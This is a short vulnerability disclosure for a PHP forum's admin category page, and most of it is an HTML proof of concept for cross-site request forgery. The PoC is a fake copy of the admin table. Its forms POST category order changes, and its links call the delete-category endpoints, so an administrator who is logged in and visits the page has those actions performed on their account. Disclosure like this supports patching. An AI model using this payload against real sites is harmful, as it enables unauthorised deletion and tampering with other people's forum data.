# Manage Category CSRF
Allows for the forum category to be reordered or deleted through CSRF.

## PoC:
```html
<link rel="stylesheet" href="http://localhost/public/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">

<table class="table table-hover">
     <thead>
       <tr>
          <th style="width:70%">Category</th>
          <th style="width:10%">Order</th>
          <th style="width:20%">Controls</th>
        </tr>
     </thead>
     <tbody>
       <tr>
        <td>
          <strong>test cat</strong><br>
          <small>test cat</small>
        </td>
        <td>
          <form action="http://localhost/admin/manage_category.php" method="POST">
            <input type="hidden" name="cat_id" value="2">
            <input type="text" class="form-control" name="cat_place" value="1">
            <input type="submit" name="change_place" style="display:none;">
          </form>
        </td>
        <td>
          <div class="btn-group">
              <li><a href="http://localhost/admin/edit_category.php/id/2">Edit Category</a></li>
              <li><a href="http://localhost/admin/manage_category.php/delete_category/2">Delete Category</a></li>
          </div>
        </td>
      </tr><tr>
        <td>
          <strong>First Category</strong><br>
          <small>First category on this forum!</small>
        </td>
        <td>
          <form action="http://localhost/admin/manage_category.php" method="POST">
            <input type="hidden" name="cat_id" value="1">
            <input type="text" class="form-control" name="cat_place" value="2">
            <input type="submit" name="change_place" style="display:none;">
          </form>
        </td>
        <td>
          <div class="btn-group">
              <li><a href="http://localhost/admin/edit_category.php/id/1">Edit Category</a></li>
              <li><a href="http://localhost/admin/manage_category.php/delete_category/1">Delete Category</a></li>
          </div>
        </td>
      </tr>
    </tbody>
</table>

<center><h3>Use <font color="red">ENTER</font> to save catagory order</h3></center>
```
